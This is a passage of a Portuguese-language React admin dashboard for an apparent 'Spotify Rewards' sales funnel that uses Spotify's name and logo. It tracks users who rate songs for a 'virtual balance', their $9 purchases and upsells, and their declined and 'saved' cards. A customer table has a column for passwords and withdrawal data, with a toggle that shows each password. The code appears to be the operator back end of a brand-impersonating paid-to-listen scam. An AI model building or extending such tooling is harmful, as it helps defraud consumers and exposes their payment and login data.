                  <p className="text-xs text-gray-400 font-mono">
                    {selectedCustomerModal.full_name} • {selectedCustomerModal.email}
                  </p>
                </div>
              </div>
              <button
                onClick={() => setSelectedCustomerModal(null)}
                className="p-2 rounded-xl bg-[#18201b] hover:bg-[#222d26] text-gray-300 hover:text-white cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Modal Content */}
            <div className="p-6 overflow-y-auto space-y-6 text-xs">
              {/* Top Mini Summary Cards */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div className="p-3.5 rounded-2xl bg-[#111613] border border-[#1f2822]">
                  <span className="text-[10px] uppercase font-bold text-gray-400 block">
                    Total Gasto (LTV)
                  </span>
                  <span className="text-xl font-black text-[#1db954] mt-0.5 block">
                    ${selectedCustomerModal.totalSpent.toFixed(2)}
                  </span>
                  <span className="text-[10px] text-gray-500">
                    {selectedCustomerModal.approvedPurchasesCount} compra(s) aprovada(s)
                  </span>
                </div>

                <div className="p-3.5 rounded-2xl bg-[#111613] border border-[#1f2822]">
                  <span className="text-[10px] uppercase font-bold text-gray-400 block">
                    Cartões Recusados
                  </span>
                  <span className="text-xl font-black text-red-400 mt-0.5 block">
                    {selectedCustomerModal.declinedCardsCount}
                  </span>
                  <span className="text-[10px] text-gray-500">Tentativas negadas</span>
                </div>

                <div className="p-3.5 rounded-2xl bg-[#111613] border border-[#1f2822]">
                  <span className="text-[10px] uppercase font-bold text-gray-400 block">
                    Músicas Avaliadas
                  </span>
                  <span className="text-xl font-black text-white mt-0.5 block">
                    {selectedCustomerModal.evaluationsCount} / 20
                  </span>
                  <span className="text-[10px] text-gray-500">No painel de tarefas</span>
                </div>

                <div className="p-3.5 rounded-2xl bg-[#111613] border border-[#1f2822]">
                  <span className="text-[10px] uppercase font-bold text-gray-400 block">
                    Saldo Acumulado App
                  </span>
                  <span className="text-xl font-black text-amber-400 mt-0.5 block">
                    ${selectedCustomerModal.virtualBalance.toFixed(2)}
                  </span>
                  <span className="text-[10px] text-gray-500">Saldo virtual interno</span>
                </div>
              </div>

              {/* Compras Aprovadas vs Ofertas Recusadas */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div className="p-4 rounded-2xl bg-[#0e1912] border border-[#1db954]/30 space-y-2.5">
                  <h4 className="font-black text-[#1db954] uppercase tracking-wider text-[11px] flex items-center gap-1.5">
                    <CheckCircle2 className="w-4 h-4" />
                    <span>Ofertas Compradas ({selectedCustomerModal.acceptedOffers.length})</span>
                  </h4>
                  {selectedCustomerModal.acceptedOffers.length === 0 ? (
                    <p className="text-gray-400 text-[11px]">Nenhuma oferta comprada ainda.</p>
                  ) : (
                    <div className="space-y-1.5">
                      {selectedCustomerModal.acceptedOffers.map((off, idx) => (
                        <div
                          key={idx}
                          className="flex items-center justify-between bg-black/40 px-3 py-2 rounded-xl border border-[#1db954]/20"
                        >
                          <span className="font-bold text-white">{off.label}</span>
                          <span className="font-mono font-black text-[#1db954]">
                            +${off.amount.toFixed(2)} USD
                          </span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                <div className="p-4 rounded-2xl bg-red-950/20 border border-red-500/30 space-y-2.5">
                  <h4 className="font-black text-red-400 uppercase tracking-wider text-[11px] flex items-center gap-1.5">
                    <Ban className="w-4 h-4" />
                    <span>Upsells/Downsells Recusados ({selectedCustomerModal.declinedOffers.length})</span>
                  </h4>
                  {selectedCustomerModal.declinedOffers.length === 0 ? (
                    <p className="text-gray-400 text-[11px]">
                      Nenhuma oferta recusada registrada para este cliente.
                    </p>
                  ) : (
                    <div className="space-y-1.5">
                      {selectedCustomerModal.declinedOffers.map((off, idx) => (
                        <div
                          key={idx}
                          className="flex items-center justify-between bg-black/40 px-3 py-2 rounded-xl border border-red-500/20"
                        >
                          <span className="font-bold text-red-200">Recusou: {off.label}</span>
                          <span className="text-[10px] text-gray-400">
                            {new Date(off.date).toLocaleString('pt-BR')}
                          </span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              {/* Histórico de Transações e Tentativas de Cartão */}
              <div className="space-y-2">
                <h4 className="font-black text-white uppercase tracking-wider text-[11px] flex items-center gap-1.5">
                  <CreditCard className="w-4 h-4 text-indigo-400" />
                  <span>Histórico de Pagamentos &amp; Tentativas de Cartão ({selectedCustomerModal.paymentsHistory.length})</span>
                </h4>
                {selectedCustomerModal.paymentsHistory.length === 0 ? (
                  <p className="text-gray-500 text-xs bg-[#111613] p-3 rounded-xl border border-[#1f2822]">
                    Nenhuma tentativa de cartão registrada na tabela de pagamentos.
                  </p>
                ) : (
                  <div className="rounded-xl border border-[#1f2822] overflow-hidden">
                    <table className="w-full text-left text-[11px]">
                      <thead className="bg-[#111613] text-gray-400 uppercase text-[10px]">
                        <tr>
                          <th className="px-3 py-2">Data / Hora</th>
                          <th className="px-3 py-2">Valor</th>
                          <th className="px-3 py-2">Status</th>
                          <th className="px-3 py-2">Detalhes / Motivo</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-[#1f2822]">
                        {selectedCustomerModal.paymentsHistory.map((p) => (
                          <tr key={p.id}>
                            <td className="px-3 py-2 text-gray-400 font-mono">
                              {new Date(p.created_at).toLocaleString('pt-BR')}
                            </td>
                            <td className="px-3 py-2 font-black text-white font-mono">
                              ${Number(p.amount || 9.0).toFixed(2)} USD
                            </td>
                            <td className="px-3 py-2">
                              {p.status === 'succeeded' ? (
                                <span className="text-[#1db954] font-bold">✅ Aprovado</span>
                              ) : (
                                <span className="text-red-400 font-bold">❌ Cartão Recusado</span>
                              )}
                            </td>
                            <td className="px-3 py-2 text-gray-300">
                              {p.error_message ||
                                (p.status === 'succeeded' ? 'Pagamento confirmado' : 'Recusado pelo banco emissor')}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>

              {/* Histórico de Cliques nos Modais de Upsell/Downsell */}
              {selectedCustomerModal.funnelHistory.length > 0 && (
                <div className="space-y-2">
                  <h4 className="font-black text-white uppercase tracking-wider text-[11px] flex items-center gap-1.5">
                    <Sparkles className="w-4 h-4 text-amber-400" />
                    <span>Rastreamento de Eventos nos Modais de Upsell ({selectedCustomerModal.funnelHistory.length})</span>
                  </h4>
                  <div className="rounded-xl border border-[#1f2822] overflow-hidden">
                    <table className="w-full text-left text-[11px]">
                      <thead className="bg-[#111613] text-gray-400 uppercase text-[10px]">
                        <tr>
                          <th className="px-3 py-2">Horário</th>
                          <th className="px-3 py-2">Oferta</th>
                          <th className="px-3 py-2">Valor</th>
                          <th className="px-3 py-2">Ação do Cliente</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-[#1f2822]">
                        {selectedCustomerModal.funnelHistory.map((ev) => (
                          <tr key={ev.id}>
                            <td className="px-3 py-2 text-gray-400 font-mono">
                              {new Date(ev.created_at).toLocaleString('pt-BR')}
                            </td>
                            <td className="px-3 py-2 font-bold text-white">{ev.offer_name}</td>
                            <td className="px-3 py-2 font-mono text-gray-300">
                              ${Number(ev.amount).toFixed(2)}
                            </td>
                            <td className="px-3 py-2">
                              {ev.action === 'accepted' ? (
                                <span className="px-2 py-0.5 rounded-full bg-[#1db954]/15 text-[#1db954] font-bold">
                                  🟢 Comprou / Aceitou
                                </span>
                              ) : ev.action === 'declined' ? (
                                <span className="px-2 py-0.5 rounded-full bg-red-500/15 text-red-300 font-bold">
                                  🔴 Recusou a Oferta
                                </span>
                              ) : ev.action === 'card_declined' ? (
                                <span className="px-2 py-0.5 rounded-full bg-red-500/20 text-red-400 font-bold">
                                  ⚠️ Cartão Recusado
                                </span>
                              ) : (
                                <span className="px-2 py-0.5 rounded-full bg-blue-500/15 text-blue-300 font-bold">
                                  👁️ Visualizou o Modal
                                </span>
                              )}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}
            </div>

            {/* Modal Footer */}
            <div className="px-6 py-3.5 bg-[#111613] border-t border-[#1f2822] flex items-center justify-end">
              <button
                onClick={() => setSelectedCustomerModal(null)}
                className="px-5 py-2 rounded-xl bg-[#1db954] hover:bg-[#1ed760] text-black font-black text-xs uppercase cursor-pointer"
              >
                Fechar Histórico
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* CABEÇALHO SUPERIOR DO ADMIN (100% EM PORTUGUÊS)                           */}
      {/* ========================================================================= */}
      <header className="sticky top-0 z-40 backdrop-blur-md bg-black/85 border-b border-[#1d2520] px-4 sm:px-8 py-4">
        <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <Link href="/spotify" className="flex items-center gap-2.5">
              <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
                <Image
                  src="/spotify-logo.webp"
                  alt="Spotify Logo"
                  width={32}
                  height={32}
                  priority
                  referrerPolicy="no-referrer"
                />
              </div>
              <span className="text-white font-black text-lg tracking-tight">Spotify Rewards</span>
            </Link>

            <span className="bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/30 text-[11px] font-extrabold uppercase px-2.5 py-0.5 rounded-full flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
              Painel Admin • Inteligência de Funil &amp; LTV
            </span>
          </div>

          <div className="flex items-center gap-2.5">
            <button
              onClick={fetchAdminData}
              disabled={isLoading}
              className="inline-flex items-center gap-2 px-3.5 py-2 rounded-xl bg-[#111613] hover:bg-[#18211b] border border-[#222f26] text-xs font-bold text-gray-200 transition-colors cursor-pointer"
            >
              <RefreshCw className={`w-3.5 h-3.5 text-[#1db954] ${isLoading ? 'animate-spin' : ''}`} />
              <span>Atualizar Dados</span>
            </button>

            <button
              onClick={exportCSV}
              className="inline-flex items-center gap-2 px-3.5 py-2 rounded-xl bg-[#111613] hover:bg-[#18211b] border border-[#222f26] text-xs font-bold text-gray-200 transition-colors cursor-pointer"
            >
              <Download className="w-3.5 h-3.5 text-blue-400" />
              <span>Exportar CSV</span>
            </button>

            <button
              onClick={handleLogout}
              className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-xs font-bold text-red-400 transition-colors cursor-pointer"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span>Sair</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-8 py-8 space-y-8">
        {/* ========================================================================= */}
        {/* 1. KPIS FINANCEIROS E DE FUNIL NO TOPO (6 CARTÕES EXECUTIVOS)             */}
        {/* ========================================================================= */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-6 gap-4">
          {/* Card 1: Faturamento Bruto Total */}
          <div className="bg-[#0b0e0c] border border-[#1db954]/40 rounded-2xl p-4 sm:p-5 shadow-xl relative overflow-hidden">
            <div className="flex items-center justify-between text-gray-400 mb-1.5">
              <span className="text-[11px] font-extrabold uppercase tracking-wider text-[#1db954]">
                Faturamento Bruto
              </span>
              <DollarSign className="w-4 h-4 text-[#1db954]" />
            </div>
            <div className="text-2xl sm:text-3xl font-black text-white tracking-tight">
              ${totalGrossRevenue.toFixed(2)}
            </div>
            <p className="text-[11px] text-gray-400 mt-1">
              Front (${frontEndRevenue.toFixed(2)}) + Upsells (${totalUpsellRevenue.toFixed(2)})
            </p>
          </div>

          {/* Card 2: Ticket Médio Real (AOV) */}
          <div className="bg-[#0b0e0c] border border-amber-500/40 rounded-2xl p-4 sm:p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-1.5">
              <span className="text-[11px] font-extrabold uppercase tracking-wider text-amber-400">
                Ticket Médio (AOV)
              </span>
              <TrendingUp className="w-4 h-4 text-amber-400" />
            </div>
            <div className="text-2xl sm:text-3xl font-black text-amber-400 tracking-tight">
              ${averageOrderValue.toFixed(2)}
            </div>
            <p className="text-[11px] text-gray-400 mt-1">
              Média gasta por cada um dos {uniqueBuyersCount} compradores
            </p>
          </div>

          {/* Card 3: Receita Extra de Upsells & Downsells */}
          <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-4 sm:p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-1.5">
              <span className="text-[11px] font-extrabold uppercase tracking-wider text-emerald-400">
                Receita de Upsells
              </span>
              <Sparkles className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-2xl sm:text-3xl font-black text-emerald-400 tracking-tight">
              ${totalUpsellRevenue.toFixed(2)}
            </div>
            <p className="text-[11px] text-gray-400 mt-1">
              {totalUpsellSalesCount} vendas extras ({upsellRevenueShare}% do lucro)
            </p>
          </div>

          {/* Card 4: Taxa de Aprovação */}
          <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-4 sm:p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-1.5">
              <span className="text-[11px] font-extrabold uppercase tracking-wider text-indigo-400">
                Taxa de Aprovação
              </span>
              <CheckCircle2 className="w-4 h-4 text-indigo-400" />
            </div>
            <div className="text-2xl sm:text-3xl font-black text-white tracking-tight">
              {approvalRate}%
            </div>
            <p className="text-[11px] text-gray-400 mt-1">
              {approvedPayments.length} aprovados de {payments.length} tentativas
            </p>
          </div>

          {/* Card 5: Cartões Recusados */}
          <div className="bg-[#0b0e0c] border border-red-500/30 rounded-2xl p-4 sm:p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-1.5">
              <span className="text-[11px] font-extrabold uppercase tracking-wider text-red-400">
                Cartão Recusado
              </span>
              <XCircle className="w-4 h-4 text-red-400" />
            </div>
            <div className="text-2xl sm:text-3xl font-black text-red-400 tracking-tight">
              {declinedPayments.length + cardTests.length}
            </div>
            <p className="text-[11px] text-gray-400 mt-1">
              {declinedPayments.length} no checkout • {cardTests.length} cartões salvos
            </p>
          </div>

          {/* Card 6: Leads Desistentes (>10m) */}
          <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-4 sm:p-5 shadow-xl">
            <div className="flex items-center justify-between text-gray-400 mb-1.5">
              <span className="text-[11px] font-extrabold uppercase tracking-wider text-rose-400">
                Desistiram (&gt;10m)
              </span>
              <UserX className="w-4 h-4 text-rose-400" />
            </div>
            <div className="text-2xl sm:text-3xl font-black text-rose-400 tracking-tight">
              {abandonedLeadsCount}
            </div>
            <p className="text-[11px] text-gray-400 mt-1">
              De {leads.length} leads totais capturados
            </p>
          </div>
        </div>

        {/* ========================================================================= */}
        {/* BARRA DE NAVEGAÇÃO DE ABAS E BUSCA EM PORTUGUÊS                           */}
        {/* ========================================================================= */}
        <div className="bg-[#0b0e0c] border border-[#1d2520] rounded-2xl p-4 sm:p-6 shadow-xl space-y-6">
          <div className="flex flex-wrap items-center justify-between gap-4 border-b border-[#1f2822] pb-4">
            {/* Abas Principais */}
            <div className="flex flex-wrap items-center gap-2">
              <button
                onClick={() => setActiveTab('funil')}
                className={`px-4 py-2.5 rounded-xl text-xs font-extrabold transition-all cursor-pointer flex items-center gap-1.5 ${
                  activeTab === 'funil'
                    ? 'bg-[#1db954] text-black shadow-md shadow-[#1db954]/20'
                    : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                }`}
              >
                <BarChart3 className="w-4 h-4" />
                <span>Raio-X do Funil &amp; Upsells</span>
              </button>

              <button
                onClick={() => setActiveTab('ranking')}
                className={`px-4 py-2.5 rounded-xl text-xs font-extrabold transition-all cursor-pointer flex items-center gap-1.5 ${
                  activeTab === 'ranking'
                    ? 'bg-[#1db954] text-black shadow-md shadow-[#1db954]/20'
                    : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                }`}
              >
                <Trophy className="w-4 h-4" />
                <span>Ranking Clientes &amp; LTV ({allCustomerProfiles.length})</span>
              </button>

              <button
                onClick={() => setActiveTab('recusados')}
                className={`px-4 py-2.5 rounded-xl text-xs font-extrabold transition-all cursor-pointer flex items-center gap-1.5 ${
                  activeTab === 'recusados'
                    ? 'bg-red-500 text-white shadow-md shadow-red-500/20'
                    : 'bg-[#111613] text-red-300 hover:text-white border border-red-500/30'
                }`}
              >
                <AlertTriangle className="w-4 h-4" />
                <span>
                  Cartões Recusados &amp; Tentativas ({declinedPayments.length + cardTests.length})
                </span>
              </button>

              <button
                onClick={() => setActiveTab('leads')}
                className={`px-4 py-2.5 rounded-xl text-xs font-extrabold transition-all cursor-pointer flex items-center gap-1.5 ${
                  activeTab === 'leads'
                    ? 'bg-[#1db954] text-black shadow-md shadow-[#1db954]/20'
                    : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                }`}
              >
                <Users className="w-4 h-4" />
                <span>Todos os Leads ({leads.length})</span>
              </button>

              <button
                onClick={() => setActiveTab('sql_editor')}
                className={`px-4 py-2.5 rounded-xl text-xs font-extrabold transition-all cursor-pointer flex items-center gap-1.5 ${
                  activeTab === 'sql_editor'
                    ? 'bg-[#1db954] text-black shadow-md shadow-[#1db954]/20'
                    : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                }`}
              >
                <Database className="w-4 h-4" />
                <span>SQL Editor (Supabase)</span>
              </button>
            </div>

            {/* Campo de Busca */}
            <div className="relative w-full sm:w-72">
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Buscar por nome, e-mail ou cartão..."
                className="w-full bg-[#131715] border border-[#26312a] rounded-xl px-3.5 py-2 text-xs text-white placeholder-[#5a6760] focus:outline-none focus:border-[#1db954] transition-colors pl-9"
              />
              <Search className="w-4 h-4 text-gray-400 absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
            </div>
          </div>

          {/* ========================================================================= */}
          {/* ABA 1: RAIO-X COMPLETO DO FUNIL DE UPSELLS E DOWNSELLS                    */}
          {/* ========================================================================= */}
          {activeTab === 'funil' && (
            <div className="space-y-6">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 bg-[#111613] border border-[#1f2822] rounded-2xl p-4">
                <div>
                  <h2 className="text-sm sm:text-base font-black text-white flex items-center gap-2">
                    <Layers className="w-4 h-4 text-[#1db954]" />
                    <span>Desempenho Detalhado por Oferta (Front-End + 5 Upsells/Downsells)</span>
                  </h2>
                  <p className="text-xs text-gray-400 mt-0.5">
                    Acompanhe quantas pessoas viram cada modal, quantas compraram, quantas clicaram em &ldquo;Não obrigado&rdquo; e quanto cada oferta colocou no seu bolso.
                  </p>
                </div>
                <div className="text-right shrink-0">
                  <span className="text-[10px] font-bold uppercase text-gray-400 block">
                    Ticket Médio Atual
                  </span>
                  <span className="text-lg font-black text-[#1db954]">
                    ${averageOrderValue.toFixed(2)} USD / cliente
                  </span>
                </div>
              </div>

              {/* Tabela de Performance por Oferta */}
              <div className="overflow-x-auto rounded-2xl border border-[#1f2822]">
                <table className="w-full text-left text-xs text-gray-300">
                  <thead className="bg-[#111613] text-gray-400 uppercase font-extrabold text-[10px] tracking-wider border-b border-[#1f2822]">
                    <tr>
                      <th className="px-4 py-3.5">Etapa / Oferta do Funil</th>
                      <th className="px-4 py-3.5">Preço</th>
                      <th className="px-4 py-3.5 text-center">Visualizações (Viram)</th>
                      <th className="px-4 py-3.5 text-center">Compras (Aceitaram)</th>
                      <th className="px-4 py-3.5 text-center">Recusas (Clicaram Não)</th>
                      <th className="px-4 py-3.5 text-center">Cartão Recusado</th>
                      <th className="px-4 py-3.5 text-center">Conversão (%)</th>
                      <th className="px-4 py-3.5 text-right">Receita Gerada</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#1f2822]">
                    {offerPerformanceStats.map((item) => (
                      <tr key={item.id} className="hover:bg-white/[0.02] transition-colors">
                        <td className="px-4 py-4">
                          <div className="flex items-center gap-2">
                            <span
                              className={`px-2 py-0.5 rounded text-[9px] font-black uppercase ${
                                item.type === 'FRONT-END'
                                  ? 'bg-indigo-500/20 text-indigo-300 border border-indigo-500/30'
                                  : item.type.startsWith('DOWNSELL')
                                  ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30'
                                  : 'bg-[#1db954]/20 text-[#1db954] border border-[#1db954]/30'
                              }`}
                            >
                              {item.type}
                            </span>
                            <span className="font-bold text-white text-xs">{item.name}</span>
                          </div>
                          <p className="text-[11px] text-gray-500 mt-0.5">{item.description}</p>
                        </td>
                        <td className="px-4 py-4 font-mono font-bold text-white">
                          ${item.price.toFixed(2)}
                        </td>
                        <td className="px-4 py-4 text-center font-mono font-bold text-blue-300">
                          {item.views}
                        </td>
                        <td className="px-4 py-4 text-center">
                          <span className="px-2.5 py-1 rounded-full bg-[#1db954]/15 text-[#1db954] border border-[#1db954]/30 font-mono font-black text-xs">
                            {item.accepted}
                          </span>
                        </td>
                        <td className="px-4 py-4 text-center">
                          <span className="px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-300 border border-amber-500/25 font-mono font-bold text-xs">
                            {item.declined}
                          </span>
                        </td>
                        <td className="px-4 py-4 text-center">
                          <span
                            className={`px-2.5 py-1 rounded-full font-mono font-bold text-xs ${
                              item.cardDeclines > 0
                                ? 'bg-red-500/15 text-red-400 border border-red-500/30'
                                : 'text-gray-500'
                            }`}
                          >
                            {item.cardDeclines}
                          </span>
                        </td>
                        <td className="px-4 py-4 text-center font-mono font-black text-white">
                          {item.convRate}%
                        </td>
                        <td className="px-4 py-4 text-right font-mono font-black text-[#1db954] text-sm">
                          ${item.revenue.toFixed(2)} USD
                        </td>
                      </tr>
                    ))}
                  </tbody>
                  <tfoot className="bg-[#111613] border-t-2 border-[#1db954]/40">
                    <tr>
                      <td colSpan={3} className="px-4 py-3.5 font-black text-white uppercase text-xs">
                        TOTAL ACUMULADO DO FUNIL COMPLETO
                      </td>
                      <td className="px-4 py-3.5 text-center font-mono font-black text-[#1db954] text-sm">
                        {offerPerformanceStats.reduce((a, b) => a + b.accepted, 0)} vendas
                      </td>
                      <td className="px-4 py-3.5 text-center font-mono font-bold text-amber-300">
                        {offerPerformanceStats.reduce((a, b) => a + b.declined, 0)} recusas
                      </td>
                      <td className="px-4 py-3.5 text-center font-mono font-bold text-red-400">
                        {offerPerformanceStats.reduce((a, b) => a + b.cardDeclines, 0)} falhas
                      </td>
                      <td className="px-4 py-3.5 text-center font-mono font-black text-amber-400">
                        AOV: ${averageOrderValue.toFixed(2)}
                      </td>
                      <td className="px-4 py-3.5 text-right font-mono font-black text-[#1db954] text-base">
                        ${totalGrossRevenue.toFixed(2)} USD
                      </td>
                    </tr>
                  </tfoot>
                </table>
              </div>

              {/* Feed em Tempo Real de Ações nos Upsells/Downsells */}
              <div className="space-y-3 pt-2">
                <h3 className="text-xs font-black uppercase tracking-wider text-gray-300 flex items-center gap-2">
                  <Clock className="w-4 h-4 text-[#1db954]" />
                  <span>Últimas Interações de Clientes nos Modais de Upsell / Downsell ({funnelEvents.length})</span>
                </h3>

                {funnelEvents.length === 0 ? (
                  <div className="p-6 rounded-2xl bg-[#111613] border border-[#1f2822] text-center text-xs text-gray-400">
                    Ainda não há cliques registrados nos modais de Upsell/Downsell. Assim que os clientes abrirem, aceitarem ou recusarem qualquer oferta no painel de músicas, cada clique aparecerá aqui em tempo real!
                  </div>
                ) : (
                  <div className="overflow-x-auto rounded-2xl border border-[#1f2822]">
                    <table className="w-full text-left text-xs text-gray-300">
                      <thead className="bg-[#111613] text-gray-400 uppercase font-bold text-[10px]">
                        <tr>
                          <th className="px-4 py-3">Data / Hora</th>
                          <th className="px-4 py-3">Cliente</th>
                          <th className="px-4 py-3">E-mail</th>
                          <th className="px-4 py-3">Oferta Exibida</th>
                          <th className="px-4 py-3">Valor</th>
                          <th className="px-4 py-3">Decisão do Cliente</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-[#1f2822] text-[11px]">
                        {funnelEvents.slice(0, 30).map((ev) => (
                          <tr key={ev.id} className="hover:bg-white/[0.02]">
                            <td className="px-4 py-2.5 font-mono text-gray-400">
                              {new Date(ev.created_at).toLocaleString('pt-BR')}
                            </td>
                            <td className="px-4 py-2.5 font-bold text-white">
                              {ev.full_name || 'Ouvinte Verificado'}
                            </td>
                            <td className="px-4 py-2.5 font-mono text-indigo-300">{ev.email}</td>
                            <td className="px-4 py-2.5 font-bold text-white">{ev.offer_name}</td>
                            <td className="px-4 py-2.5 font-mono font-bold text-white">
                              ${Number(ev.amount).toFixed(2)} USD
                            </td>
                            <td className="px-4 py-2.5">
                              {ev.action === 'accepted' ? (
                                <span className="px-2.5 py-0.5 rounded-full bg-[#1db954]/15 text-[#1db954] border border-[#1db954]/30 font-bold text-[10px]">
                                  🟢 COMPROU O UPSELL
                                </span>
                              ) : ev.action === 'declined' ? (
                                <span className="px-2.5 py-0.5 rounded-full bg-red-500/15 text-red-300 border border-red-500/30 font-bold text-[10px]">
                                  🔴 RECUSOU (CLICOU NÃO)
                                </span>
                              ) : ev.action === 'card_declined' ? (
                                <span className="px-2.5 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/40 font-bold text-[10px]">
                                  ⚠️ CARTÃO RECUSADO
                                </span>
                              ) : (
                                <span className="px-2.5 py-0.5 rounded-full bg-blue-500/15 text-blue-300 border border-blue-500/30 font-bold text-[10px]">
                                  👁️ VIU O MODAL
                                </span>
                              )}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* ========================================================================= */}
          {/* ABA 2: RANKING DE CLIENTES ("WHALES" / QUEM ESTÁ COMPRANDO MAIS)          */}
          {/* ========================================================================= */}
          {activeTab === 'ranking' && (
            <div className="space-y-4">
              {/* Sub-filtros rápidos */}
              <div className="flex flex-wrap items-center justify-between gap-3">
                <div className="flex flex-wrap items-center gap-2 text-xs">
                  <span className="text-gray-400 font-bold">Filtrar clientes:</span>
                  <button
                    onClick={() => setRankingFilter('all')}
                    className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                      rankingFilter === 'all'
                        ? 'bg-[#1db954] text-black'
                        : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                    }`}
                  >
                    Todos os Clientes ({allCustomerProfiles.length})
                  </button>

                  <button
                    onClick={() => setRankingFilter('buyers')}
                    className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                      rankingFilter === 'buyers'
                        ? 'bg-[#1db954] text-black'
                        : 'bg-[#111613] text-gray-300 hover:text-white border border-[#222f26]'
                    }`}
                  >
                    💰 Compradores Aprovados ({allCustomerProfiles.filter((c) => c.totalSpent > 0).length})
                  </button>

                  <button
                    onClick={() => setRankingFilter('upsell_buyers')}
                    className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                      rankingFilter === 'upsell_buyers'
                        ? 'bg-amber-400 text-black'
                        : 'bg-[#111613] text-amber-300 hover:text-white border border-amber-500/30'
                    }`}
                  >
                    🏆 Compraram Upsell/Downsell (
                    {allCustomerProfiles.filter((c) => c.acceptedOffers.some((o) => o.id !== 'front_9_00')).length})
                  </button>

                  <button
                    onClick={() => setRankingFilter('declined_upsell')}
                    className={`px-3 py-1.5 rounded-xl text-[11px] font-bold transition-colors cursor-pointer ${
                      rankingFilter === 'declined_upsell'
                        ? 'bg-rose-500 text-white'
                        : 'bg-[#111613] text-rose-300 hover:text-white border border-rose-500/30'
                    }`}
                  >
                    🔴 Recusaram Algum Upsell ({allCustomerProfiles.filter((c) => c.declinedOffers.length > 0).length})
                  </button>
                </div>

                <span className="text-[11px] text-gray-400">
                  Ordenado automaticamente por <b className="text-[#1db954]">Maior Valor Gasto (LTV)</b>
                </span>
              </div>

              <div className="overflow-x-auto rounded-2xl border border-[#1f2822]">
                <table className="w-full text-left text-xs text-gray-300">
                  <thead className="bg-[#111613] text-gray-400 uppercase font-extrabold text-[10px] tracking-wider border-b border-[#1f2822]">
                    <tr>
                      <th className="px-4 py-3.5">Posição / Cliente</th>
                      <th className="px-4 py-3.5">Total Gasto (LTV)</th>
                      <th className="px-4 py-3.5">O Que Comprou vs. O Que Recusou (Upsells / Downsells)</th>
                      <th className="px-4 py-3.5">Senha &amp; Dados de Saque</th>
                      <th className="px-4 py-3.5 text-center">Músicas &amp; Saldo App</th>
                      <th className="px-4 py-3.5 text-right">Ações</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#1f2822]">
                    {filteredCustomerProfiles.length === 0 ? (
                      <tr>
                        <td colSpan={6} className="px-4 py-8 text-center text-gray-500">
                          Nenhum cliente encontrado com este filtro.
                        </td>
                      </tr>
                    ) : (
                      filteredCustomerProfiles.map((cust, index) => {
                        const isPwVisible = visiblePasswords[cust.email] || false;
                        const acc = cust.account;
                        return (
                          <tr key={cust.email} className="hover:bg-white/[0.02] transition-colors">
                            {/* Posição + Nome + Email */}
                            <td className="px-4 py-4">
                              <div className="flex items-center gap-2.5">
                                <span
                                  className={`w-6 h-6 rounded-full flex items-center justify-center font-black text-[11px] shrink-0 ${
                                    index === 0 && cust.totalSpent > 0
                                      ? 'bg-amber-400 text-black shadow-md shadow-amber-400/20'
                                      : index === 1 && cust.totalSpent > 0
                                      ? 'bg-gray-300 text-black'
                                      : index === 2 && cust.totalSpent > 0
                                      ? 'bg-amber-700 text-white'
                                      : 'bg-[#18201b] text-gray-400 border border-[#26312a]'
                                  }`}
                                >
                                  #{index + 1}
                                </span>
                                <div>
                                  <span className="font-bold text-white block">{cust.full_name}</span>
                                  <span className="text-[11px] text-indigo-300 font-mono block">
                                    {cust.email}
                                  </span>
                                </div>
                              </div>
                            </td>

                            {/* Total Gasto (LTV) */}
                            <td className="px-4 py-4">
                              <div className="font-mono font-black text-base text-[#1db954]">
                                ${cust.totalSpent.toFixed(2)} <span className="text-[10px] text-gray-400">USD</span>
                              </div>
